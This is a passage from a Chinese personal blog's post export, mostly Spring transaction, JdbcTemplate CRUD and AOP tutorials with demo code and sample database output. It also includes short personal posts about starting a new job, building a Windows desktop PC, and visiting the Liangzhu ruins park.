username&#x3D;?,password&#x3D;? where id&#x3D;?&quot;; Object[] params&#x3D;new Object[]&#123; user.getUsername(), user.getPassword(), user.getId() &#125;; int num&#x3D;this.jdbcTemplate.update(sql,params); return num; &#125; @Override public int deleteUser(int id) &#123; String sql&#x3D;&quot;delete from user where id&#x3D;?&quot;; int num&#x3D;this.jdbcTemplate.update(sql,id); return num; &#125; @Override public User findUserById(int id) &#123; String sql&#x3D;&quot;select * from user where id&#x3D;?&quot;; RowMapper&lt;User&gt; rowMapper&#x3D;new BeanPropertyRowMapper&lt;User&gt;(User.class); return this.jdbcTemplate.queryForObject(sql,rowMapper,id); &#125; @Override public List&lt;User&gt; findAllUser() &#123; String sql&#x3D;&quot;select * from user&quot;; RowMapper&lt;User&gt; rowMapper&#x3D;new BeanPropertyRowMapper&lt;User&gt;(User.class); return this.jdbcTemplate.query(sql,rowMapper); &#125; @Override public void transfer(String outUser, String inUser, Integer jifen) &#123; &#x2F;&#x2F; 赠送积分 this.jdbcTemplate.update(&quot;update user set jifen&#x3D;jifen+? where username&#x3D;?&quot;,jifen,inUser); &#x2F;&#x2F; 模拟系统运行时的突发性问题 int i &#x3D;1&#x2F;0; &#x2F;&#x2F;赠送出积分 this.jdbcTemplate.update(&quot;update user set jifen&#x3D;jifen-? where username&#x3D;?&quot;,jifen,outUser); &#125;&#125; 接下来我们定义一个applicationContext.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:aop&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&quot; xmlns:tx&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;tx&#x2F;spring-tx-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context-4.3.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;aop&#x2F;spring-aop-4.3.xsd&quot;&gt;&lt;!--1.配置数据源 --&gt;&lt;bean id&#x3D;&quot;dataSource&quot; class&#x3D;&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;&gt; &lt;!--数据库驱动 --&gt; &lt;property name&#x3D;&quot;driverClassName&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot; &#x2F;&gt; &lt;!--连接数据库的ur1 --&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;192.168.10.128:3306&#x2F;spring_db&quot; &#x2F;&gt; &lt;!--连接数据库的用户名 --&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot; &#x2F;&gt; &lt;!--连接数据库的密码 --&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;123456&quot; &#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--2.配置JDBC模板 --&gt;&lt;bean id&#x3D;&quot;jdbcTemplate&quot; class&#x3D;&quot;org.springframework.jdbc.core.JdbcTemplate&quot;&gt; &lt;!--默认必须使用数据源 --&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot; &#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--3.定义id为userDao的Bean --&gt;&lt;bean id&#x3D;&quot;userDao&quot; class&#x3D;&quot;com.SpringDemo.UserDaoImpl&quot;&gt; &lt;!--将 jdbcTemplate注入到 userDao实例中 --&gt; &lt;property name&#x3D;&quot;jdbcTemplate&quot; ref&#x3D;&quot;jdbcTemplate&quot; &#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--4.事务管理器，依赖于数据源 --&gt;&lt;bean id&#x3D;&quot;transactionManager&quot; class&#x3D;&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--5.注册事务管理驱动 --&gt;&lt;tx:annotation-driven transaction-manager&#x3D;&quot;transactionManager&quot;&gt;&lt;&#x2F;tx:annotation-driven&gt;&lt;&#x2F;beans&gt; Spring 的事务管理方式有2种，一种是传统的编程序事务管理，即通过代码来管理事务的开始、执行和异常以及回滚，一种是声明式管理，即通过配置文件的方式，原理是通过AOP技术实现，我们在实际开发过程中推荐使用声明式事务管理，效率会大大提升，因为只需要通过配置即可。 在该接口中我们我们重写transfer的方法，更新数据库将inUser 的积分进行增加，而对应的outUser 积分要进行减少，但是在这里我们要模拟系统运行的一些突然性问题。之后我们加了一个@Transactionl 注解，并设置了propagation、Isolation、readOnly 三个参数 123456789101112@Override @Transactional(propagation &#x3D; Propagation.REQUIRED,isolation &#x3D; Isolation.DEFAULT, readOnly &#x3D; false) public void transfer(String outUser, String inUser, Integer jifen) &#123; &#x2F;&#x2F; 赠送积分 this.jdbcTemplate.update(&quot;update user set jifen&#x3D;jifen+? where username&#x3D;?&quot;,jifen,inUser); &#x2F;&#x2F; 模拟系统运行时的突发性问题 int i &#x3D;1&#x2F;0; &#x2F;&#x2F;赠送出积分 this.jdbcTemplate.update(&quot;update user set jifen&#x3D;jifen-? where username&#x3D;?&quot;,jifen,outUser); &#125; 注解 @Transactional 的参数含义如下 属性名 说明 name 当在配置文件中有多个 TransactionManager , 可以用该属性指定选择哪个事务管理器。 propagation 事务的传播行为，默认值为 REQUIRED。 isolation 事务的隔离度也可以叫隔离级别，默认值采用 DEFAULT。 timeout 事务的超时时间，默认值为-1。如果超过该时间限制但事务还没有完成，则自动回滚事务。 read-only 指定事务是否为只读事务，默认值为 false；为了忽略那些不需要事务的方法，比如读取数据，可以设置 read-only 为 true。 rollback-for 用于指定能够触发事务回滚的异常类型，如果有多个异常类型需要指定，各类型之间可以通过逗号分隔。 no-rollback- for 抛出 no-rollback-for 指定的异常类型，不回滚事务。 @Transactional 注解也可以添加到类级别上。当把@Transactional 注解放在类级别时，表示所有该类的公共方法都配置相同的事务属性信息。 isolcation 除了 DEFAULT，还有其他属性，我们可以在Isolation 这个类中看到相对于的定位 1234567891011121314151617public enum Isolation &#123; DEFAULT(-1), READ_UNCOMMITTED(1), READ_COMMITTED(2), REPEATABLE_READ(4), SERIALIZABLE(8); private final int value; private Isolation(int value) &#123; this.value &#x3D; value; &#125; public int value() &#123; return this.value; &#125;&#125; Propagation 的属性如下 12345678910111213141516171819public enum Propagation &#123; REQUIRED(0),&#x2F;&#x2F;表示当前方法必须运行在一个事务环境中，如果存在就直接使用，否则开启一个新的事务执行该方法 SUPPORTS(1),&#x2F;&#x2F;如果当前方法处于事务环境中则使用，否则不使用事务 MANDATORY(2),&#x2F;&#x2F;表示该方法的线程必须在事务中否则抛出异常 REQUIRES_NEW(3), &#x2F;&#x2F;要求在新事务中执行，如果已经在事务中了则先暂停然后启动新事务执行，如果不在则启动一个新事务后执行 NOT_SUPPORTED(4), &#x2F;&#x2F;不支持当前事务，总是以非事务状态执行，如果调用该方法的线程处于事务中泽先暂停然后执行 NEVER(5), &#x2F;&#x2F;不支持当前执行的方法在事务中，如果在抛出异常 NESTED(6); &#x2F;&#x2F;即便当前执行的方法在事务中也会启动一个新事务，然后执行该方法 private final int value; private Propagation(int value) &#123; this.value &#x3D; value; &#125; public int value() &#123; return this.value; &#125;&#125; 此外使用@Transactional 必须保证是在public 级别的方法中使用，@Transactional 只能应用到 public 方法才有效，这是因为在使用 Spring AOP 代理时，Spring 在调用 TransactionInterceptor 在目标方法执行前后进行拦截之前，DynamicAdvisedInterceptor（CglibAopProxy 的内部类）的的 intercept 方法或 JdkDynamicAopProxy 的 invoke 方法会间接调用 AbstractFallbackTransactionAttributeSource（Spring 通过这个类获取 @Transactional 注解的事务属性配置属性信息）的 computeTransactionAttribute 方法。 接下来我们创建一个测试类来进行测试 1234567891011121314151617package com.SpringDemo;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class TransactionTest &#123; public static void main(String[] args) &#123; ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); UserDao userDao &#x3D; (UserDao) applicationContext.getBean(&quot;userDao&quot;); userDao.transfer(&quot;zhangsan&quot;,&quot;lisi&quot;,100); System.out.println(&quot;赠送积分成功&quot;); &#125;&#125; 我们执行上述程序，可以发现报错了,程序报 1Exception in thread &quot;main&quot; java.lang.ArithmeticException: &#x2F; by zero 如图所示 此时，我们查看数据库中的数据没有发生任何变化 123456789MariaDB [spring_db]&gt; select * from user;+----+----------+----------+-------+| id | username | password | jifen |+----+----------+----------+-------+| 1 | zhangsan | 123 | 1000 || 2 | lisi | 1234 | 1000 || 3 | wangwu | 1234 | 1000 |+----+----------+----------+-------+3 rows in set (0.000 sec) 而当我们把 int i =1/0; 注释掉再次执行就会发现程序执行没有报错了，并且数据发生了变化 123456789MariaDB [spring_db]&gt; select * from user;+----+----------+----------+-------+| id | username | password | jifen |+----+----------+----------+-------+| 1 | zhangsan | 123 | 900 || 2 | lisi | 1234 | 1100 || 3 | wangwu | 1234 | 1000 |+----+----------+----------+-------+3 rows in set (0.000 sec) 好了，以上就是关于Spring的事务管理介绍。","categories":[{"name":"Spring","slug":"Spring","permalink":"https://awen.me/categories/Spring/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://awen.me/tags/Spring/"}]},{"title":"入职第一周","slug":"入职第一周","date":"2020-04-05T13:22:31.000Z","updated":"2021-02-26T06:05:29.313Z","comments":true,"path":"posts/9932abc7.html","link":"","permalink":"https://awen.me/posts/9932abc7.html","excerpt":"","text":"本周二开始入职有赞，周三请了一天假回网易办离职，朋友都说我这个操作特别的骚气，我也觉得，以前可没干过，主要还是因为有赞那边说只有周二和周四回办理入职的手续。 进入有赞什么感受呢: 以我们组来说，都很年轻化，我在组里已经算不得小鲜肉了。 有赞的入职培训还是很正规的，哪怕是在网易也没有说入职第一天就安排各种IT培训之类的，这种都说到了工位自己去摸索或请教同事。 签的是电子合同，没有纸质合同。 这2天做的最多的事情就是自我介绍。不过我觉得这个是个好事情，互相认识方便开展工作。","categories":[],"tags":[]},{"title":"自用电脑转Windows平台","slug":"自用电脑转Windows平台","date":"2020-04-05T13:20:59.000Z","updated":"2021-02-26T06:05:29.355Z","comments":true,"path":"posts/8a984de1.html","link":"","permalink":"https://awen.me/posts/8a984de1.html","excerpt":"","text":"不得不说 macbook 是一件很保值的产品，我16年入手的港版15款MacBook，购买的时候是8000多 今天被我4000块钱卖了，配置是i5 8g 256ssd 本来是打算走爱回收卖掉的，但是爱回收在京东的入口加上券才给3500，对比下选择了线下电脑城一个老板回收了。 其实我觉得电脑这玩意就是一个工具，我没有什么信仰，对于我来说是mac 还是 Windows 其实都一样，以前买这台mac 是因为上上家公司购买 macbook 办公有补贴，所以就买了，用了4年，算下来也是不亏的。于是开开心心的卖了。因为这台mac 在我录制视频剪辑的时候会很卡，正好现在的公司又给配了一台2019款的mac，所以我这台mac其实就可以下岗了。如果闲置着越往后越贬值了不如趁着还值几个钱卖了搞个台式机还可以用个六七年不成问题 卖了之后直接就在老板那配个Windows台式机扔家里，其实自从微软推出了Windows 10 我感觉 Windows 也是越来越好用了，而 mac 主要胜在系统的流畅性以及item2等工具非常适合开发，但是 Windows 其实也可以，比如我现在使用vscode +hexo+git+markdown 写文档，写完直接 vscode 一键提交，完全不用切换窗口。毕竟不论是 mac 还是Windows 都只是个工具而已。 因此，卖掉后我直接自己装了一台Windows 台式机，本来是打算选择京东自营的，但是从京东看整套配件价格在6280,如下所示 配件 型号 京东价格 cpu AMD 锐龙7 3700X 处理器 (r7)7nm 8核16线程 3.6GHz 65W AM4接口 盒装CPU 2249 主板 微星（MSI）B450M MORTAR MAX迫击炮 电竞电脑主板 支持3700X/3600X/3600/2600 CPU（AMD B450/Socket AM4） 739 内存 金士顿(Kingston) DDR4 3200 16GB(8G×2)套装 台式机内存条 骇客神条 Fury雷电系列 689 ssd 硬盘 三星（SAMSUNG）250GB SSD固态硬盘 M.2接口(NVMe协议) 970 EVO Plus（MZ-V7S250B） 529 显卡 影驰 GTX1660Super/GTX1660TI 6G GDDR6 台式电脑游戏显卡 GTX1660Super大将6G 高频版 1599 机箱 先马（SAMA）黑洞7 中塔主动静音台式电脑主机箱 支持ATX主板/宽体五金/标配3风扇4面静音棉/背线/独立电源仓 209 电源 长城（GreatWall）额定500W HOPE-6000DS 电源 （70cm超长背板走线/三年质保/台系电容/12cm静音风扇/宽幅） 249 总价 6263 结果我发现线下配还便宜200多，但是可能是因为我比较懂硬件的配置，没有被坑，今天跟我在一个地方装机的女生，是个主播，我就看到老板给他写的配置，那真的是给小白写的。CPU 就直接写I5，具体是几代不提的，所以如果你不懂配置，不建议去逛电脑城，老板最喜欢的就是这种，他会把一些难卖的产品或者对于他来说有赚头的产品卖给你而不是你想要的产品。 很多人会说京东买的售后会好些，其实我觉得线下线上都一样。另外我觉得很多人喜欢用鲁大师跑分，手机也跑分，我觉得真的没必要在乎这些。这玩意骗骗小白而已，真把他当回事就有点过了，其实现在不管你怎么配，只要硬件是新款的性能都说完全够用的，除非你是发烧友或者是专业级的用来处理视频渲染，当然都会搞这个了肯定多多少少对硬件有一定了解了。小白而言其实主流配置就可以。最多一套5000完全够用了。 这台电脑我给他定的使用年限是6年。 测试下磁盘速度如下，还是可以的，我也不怎么玩游戏其实250G对于我来说够用了","categories":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"如何使用Spring JDBC 来实现增删改查","slug":"如何使用Spring-JDBC-来实现增删改查","date":"2020-03-29T12:36:23.000Z","updated":"2021-02-26T06:05:29.324Z","comments":true,"path":"posts/8a984ee7.html","link":"","permalink":"https://awen.me/posts/8a984ee7.html","excerpt":"","text":"Spring框架针对数据库提供了JdbcTemplate 类，JdbcTemplate 是Spring 数据抽象层的基础，其他更高层次的抽象类都是构建在其基础之上，JdbcTemplate 是Spring JDBC的核心类。JdbcTemplate 继承自抽象类JdbcAccessor，同时实现了JdbcOperations 接口，JdbcTemplate定义在了JdbcTemplate类中从而可以使用增删改查来对数据库进行操作。JdbcTemplate 的直接父类是JdbcAccessor，它提供了一些访问数据库时所需要使用的公共属性，包括DataSource以及SQLExceptionTranslator 等。前者用于获取数据库连接以及引入对数据库连接的缓冲池以及分布式事务等支出。后者是对SQLException 进行转译工作。 Spring JDBC的配置Spring JDBC 模块主要包括core、dataSource、object、support四个包 core 包括JDBC的核心功能，例如JdbcTemplate类、simpleJdbcInsert类、simpleJdbcCall 类以及NamedParameterJdbcTemplate类。 dataSource 包括了访问数据库的实用工具类。 object 以OOP的方式访问数据库，它允许执行查询操作并将返回结果作为业务对象，可以在数据表和业务对象的属性直接映射查询关系。 support 包括core 和object包的支持类，例如提供一些SQLException类。 我们了解了这些模块的功能，接来下我们看看怎么去配置JDBC，请看下面的xml文件 1234567891011121314151617181920212223&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans-4.3.xsd&quot;&gt; &lt;!--1配置数据源 --&gt; &lt;bean id&#x3D;&quot;dataSource&quot; class&#x3D;&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;&gt; &lt;!--数据库驱动 --&gt; &lt;property name&#x3D;&quot;driverClassName&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot; &#x2F;&gt; &lt;!--连接数据库的ur1 --&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;spring_db&quot; &#x2F;&gt; &lt;!--连接数据库的用户名 --&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot; &#x2F;&gt; &lt;!--连接数据库的密码 --&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;root&quot; &#x2F;&gt; &lt;&#x2F;bean&gt; &lt;!--2配置JDBC模板 --&gt; &lt;bean id&#x3D;&quot;jdbcTemplate&quot; class&#x3D;&quot;org.springframework.jdbc.core.JdbcTemplate&quot;&gt; &lt;!--默认必须使用数据源 --&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot; &#x2F;&gt; &lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt; 在上述xml 文件中的beans 中定义了三个bean，分别是dataSource、jdbcTemplate。 其中dataSource中的4个属性分别对应的是 driverClassName，它是数据库的驱动 url 数据库的访问地址 username 数据库的用户名 password 数据库的密码 在使用传统的JDBC操作数据库时，这些参数我们也是要配置的。 下面我们通过实例的方式来讲解如何通过JDBC来对数据库进行操作，我们需要进行以下准备工作 1.配置maven的pom.xml 下载所需要的jar包 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;mysql&#x2F;mysql-connector-java --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;8.0.19&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; 2.需要有一个可以反问的数据库，比如我的数据库设置密码为root 1mysqladmin -u root password root 3.创建一个spring_db 的表 12MariaDB [(none)]&gt; create database spring_db;Query OK, 1 row affected (0.000 sec) 在idea 工程中新建一个com.ssm.jdbc 的包，并在该包中创建一个JdbcTempTest的测试类，首先我们加载xml 配置，配置文件就是上面的xml配置文件，我们创建一个数据表为user_table，使用jdbctemp.execute(String s) 方法执行SQL语句 1234567891011@Test public void TestJdbcTemplate() &#123; &#x2F;&#x2F;加载配置 ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;jdbc.xml&quot;); &#x2F;&#x2F;获取JdbcTemplate实例 JdbcTemplate jdbctemp &#x3D; (JdbcTemplate) applicationContext.getBean(&quot;jdbcTemplate&quot;); jdbctemp.execute(&quot;create table user_table(&quot; + &quot;id int primary key auto_increment,&quot; + &quot;username varchar(80),&quot; + &quot;password varchar(40))&quot;); &#125; 进入数据库，我们可以看到该表已经被创建出来了 1234567891011121314MariaDB [(none)]&gt; use spring_db;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [spring_db]&gt; show tables;+---------------------+| Tables_in_spring_db |+---------------------+| user_table |+---------------------+1 row in set (0.000 sec)MariaDB [spring_db]&gt; 下面，我们通过jdbc 来实现增删改查操作，首先，我们要创建一个类，名字为User，这个User 类中包含了用户的id、用户名和密码信息，并设置其set和get属性 12345678910111213141516171819202122232425262728package com.ssm.jdbc;public class User &#123; private Integer id; private String username; private String password; public Integer getId() &#123; return id; &#125; public void setId(Integer id) &#123; this.id &#x3D; id; &#125; public String getUsername() &#123; return username; &#125; public void setUsername(String username) &#123; this.username &#x3D; username; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password &#x3D; password; &#125; public String toString() &#123; return &quot;User [id&#x3D;&quot; + id + &quot;, username&#x3D;&quot; + username + &quot;, password&#x3D;&quot; + password + &quot;]&quot;; &#125;&#125; 然后我们创建一个UserDao 接口，该接口定义了添加、更新、删除、根据ID查询和查询所有用户的方法 1234567891011121314package com.ssm.jdbc;import java.util.List;public interface UserDao &#123; public int addUser(User user); public int updateUser(User user); public int deleteUser(int id); &#x2F;&#x2F;通过id查询用户 public User findUserById(int id); &#x2F;&#x2F;查询所有用户 public List&lt;User&gt; findAllUser();&#125; 接下来，我们来对UserDao的接口进行实现，在这个方法中我们对具体的增删改查逻辑进行设置，直接看代码吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.ssm.jdbc;import org.springframework.jdbc.core.BeanPropertyRowMapper;import org.springframework.jdbc.core.JdbcTemplate;import org.springframework.jdbc.core.RowMapper;import java.util.List;public class UserDaoImpl implements UserDao &#123; private JdbcTemplate jdbcTemplate; public void setJdbcTemplate(JdbcTemplate jdbcTemplate) &#123; this.jdbcTemplate &#x3D; jdbcTemplate; &#125; @Override public int addUser(User user) &#123; String sql&#x3D;&quot;insert into user_table(username,password) value(?,?)&quot;; Object[] obj&#x3D;new Object[]&#123; user.getUsername(), user.getPassword() &#125;; int num&#x3D;this.jdbcTemplate.update(sql,obj); return num; &#125; @Override public int updateUser(User user) &#123; String sql&#x3D;&quot;update user_table set username&#x3D;?,password&#x3D;? where id&#x3D;?&quot;; Object[] params&#x3D;new Object[]&#123; user.getUsername(), user.getPassword(), user.getId() &#125;; int num&#x3D;this.jdbcTemplate.update(sql,params); return num; &#125; @Override public int deleteUser(int id) &#123; String sql&#x3D;&quot;delete from user_table where id&#x3D;?&quot;; int num&#x3D;this.jdbcTemplate.update(sql,id); return num; &#125; @Override public User findUserById(int id) &#123; String sql&#x3D;&quot;select * from user_table where id&#x3D;?&quot;; RowMapper&lt;User&gt; rowMapper&#x3D;new BeanPropertyRowMapper&lt;User&gt;(User.class); return this.jdbcTemplate.queryForObject(sql,rowMapper,id); &#125; @Override public List&lt;User&gt; findAllUser() &#123; String sql&#x3D;&quot;select * from user_table&quot;; RowMapper&lt;User&gt; rowMapper&#x3D;new BeanPropertyRowMapper&lt;User&gt;(User.class); return this.jdbcTemplate.query(sql,rowMapper); &#125;&#125; 然后我们在jdbc.xml 中加入bean，加入UserDao 12345&lt;!-- 定义id为userDao的Bean --&gt; &lt;bean id&#x3D;&quot;userDao&quot; class&#x3D;&quot;com.ssm.jdbc.UserDaoImpl&quot;&gt; &lt;!--将 jdbcTemplate注入到 userDao实例中 --&gt; &lt;property name&#x3D;&quot;jdbcTemplate&quot; ref&#x3D;&quot;jdbcTemplate&quot; &#x2F;&gt; &lt;&#x2F;bean&gt; 好了，一切准备就绪，我们接来下通过测试类来测试下具体的增删改查。 首先来测试下添加用户方法，如图下所示 12345678910111213141516171819@Test public void addUserTest()&#123; &#x2F;&#x2F;加载jdbc.xml 配置文件 ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;jdbc.xml&quot;); &#x2F;&#x2F;获取UserDao实例 UserDao userDao &#x3D; (UserDao) applicationContext.getBean(&quot;userDao&quot;); &#x2F;&#x2F;创建user实例 User user &#x3D; new User(); &#x2F;&#x2F;设置属性 user.setUsername(&quot;张三&quot;); user.setPassword(&quot;123&quot;); &#x2F;&#x2F;添加用户 int num &#x3D; userDao.addUser(user); if (num &gt; 0) &#123; System.out.println(&quot;Success insert &quot;+num+&quot; data&quot;); &#125;else &#123; System.out.println(&quot;erro&quot;); &#125; &#125; 更新用户 1234567891011121314151617181920@Test public void updateUserTest()&#123; &#x2F;&#x2F;加载jdbc.xml 配置文件 ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;jdbc.xml&quot;); &#x2F;&#x2F;获取UserDao实例 UserDao userDao &#x3D; (UserDao) applicationContext.getBean(&quot;userDao&quot;); &#x2F;&#x2F;创建user实例 User user &#x3D; new User(); &#x2F;&#x2F;设置属性 user.setId(1); user.setUsername(&quot;李四&quot;); user.setPassword(&quot;12345&quot;); &#x2F;&#x2F;更新用户信息 int num &#x3D; userDao.updateUser(user); if (num &gt; 0) &#123; System.out.println(&quot;Success update &quot;+num+&quot; data&quot;); &#125;else &#123; System.out.println(&quot;erro&quot;); &#125; &#125; 删除用户 1234567891011121314@Test public void delUserTest()&#123; &#x2F;&#x2F;加载jdbc.xml 配置文件 ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;jdbc.xml&quot;); &#x2F;&#x2F;获取UserDao实例 UserDao userDao &#x3D; (UserDao) applicationContext.getBean(&quot;userDao&quot;); &#x2F;&#x2F;删除，传入ID值 int num &#x3D; userDao.deleteUser(1); if (num &gt; 0) &#123; System.out.println(&quot;Success delete &quot;+num+&quot; data&quot;); &#125;else &#123; System.out.println(&quot;erro&quot;); &#125; &#125; 查询用户信息，包括了根据ID查询和查询所有 12345678910111213141516171819202122232425@Testpublic void findUserTest()&#123; &#x2F;&#x2F;加载jdbc.xml 配置文件 ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;jdbc.xml&quot;); &#x2F;&#x2F;获取UserDao实例 UserDao userDao &#x3D; (UserDao) applicationContext.getBean(&quot;userDao&quot;); &#x2F;&#x2F;根据ID查询用户 User user &#x3D; userDao.findUserById(2); System.out.println(user);&#125;@Testpublic void findAllUserTest()&#123; &#x2F;&#x2F;加载jdbc.xml 配置文件 ApplicationContext applicationContext &#x3D; new ClassPathXmlApplicationContext(&quot;jdbc.xml&quot;); &#x2F;&#x2F;获取UserDao实例 UserDao userDao &#x3D; (UserDao) applicationContext.getBean(&quot;userDao&quot;); &#x2F;&#x2F;根据ID查询用户 List&lt;User&gt; list &#x3D; userDao.findAllUser(); for (User user:list)&#123; System.out.println(user); &#125;&#125;","categories":[{"name":"Spring","slug":"Spring","permalink":"https://awen.me/categories/Spring/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://awen.me/tags/Spring/"}]},{"title":"游良渚遗址公园记","slug":"游良渚遗址公园","date":"2020-03-28T13:17:31.000Z","updated":"2021-02-26T06:05:29.346Z","comments":true,"path":"posts/b6749da7.html","link":"","permalink":"https://awen.me/posts/b6749da7.html","excerpt":"","text":"良渚遗址公园位于浙江省杭州市瓶窑镇，良渚文化距今5000多年，大约公元前3400年 – 公元前2250年，属于中国新石器时代。 1936年被首次发现，在反山王墓中发现了几千件精美的玉器，含有璧、琮、钺、璜、冠形器、三叉形玉器、玉镯、玉管、玉珠、玉坠、柱形玉器、锥形玉器、玉带及环等，其中在反山12号墓出土的玉琮，是新石器时代良渚文化的玉琮之首，故称“玉琮王”，据《周礼·春官·大宗伯》记载：“以苍璧礼天、黄琮礼地。” 琮是用来祭祀地神的，具有通灵的功能。 随后在几代人考古学家的发掘探索下发现了良渚古城遗址。包括城墙、宫殿、水利系统等，也就是说在五千年以前良渚这个地方就已经孕育出了一个国家。当时的水坝遗址鉴定比传说中的大禹治水故事的通认年代还早数百年至千年。这种水利系统很可能是距今为止最早的水利工程，良渚先民们通过草裹泥来砌大坝治理水。 2019年良渚申遗成功，至此良渚文化已经成为世界历史中绕不过去的话题。 趁着疫情期间公园免费参观，在寒风之中我和老婆一起过去参观一番，虽然是疫情而且还下着小雨，但是游园的人还是蛮多的，进了公园后，如果不了解良渚的历史，你可能会发现这个公园真的没那么的好玩，因为进去之后需要凭借你的想象力来还原良渚先民们是如何在这里生活和工作的。 去年在把房子买在了良渚，距离遗址公园也蛮近的，等房子交付后可以没事就进来晃晃，现在这个季节公园里面的油菜花开的还不错。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Spring AOP 基于注解的声明式AspectJ详解","slug":"Spring-AOP-基于注解的声明式AspectJ详解","date":"2020-03-28T02:40:18.000Z","updated":"2021-02-26T06:05:29.265Z","comments":true,"path":"posts/966df44c.html","link":"","permalink":"https://awen.me/posts/966df44c.html","excerpt":"","text":"在 Spring 中 AOP 是一个非常非常重要的概念，那么什么是AOP呢？ AOP 即面向切面编程，也可以叫做面向方向编程，AOP不是一个新东西，它是OOP，即面向对象编程的一种补充，在当前已经成为一种成熟的编程方式。 为啥要使用 AOP在学习AOP 之前，我们先了解下为啥我们要使用AOP？ 那么，在传统的业务处理代码中，比如你要操作数据库，会进行事务的处理或者打印一些日志。虽然通过OOP 也可以实现，比如通过继承或组合的方式来达到代码的复用，但是如果实现某些功能，比如日志记录，相同的代码会分散到各个方法中，如果后面要想关闭某个功能或进行修改就必须要修改所有的方法，非常的不方便。 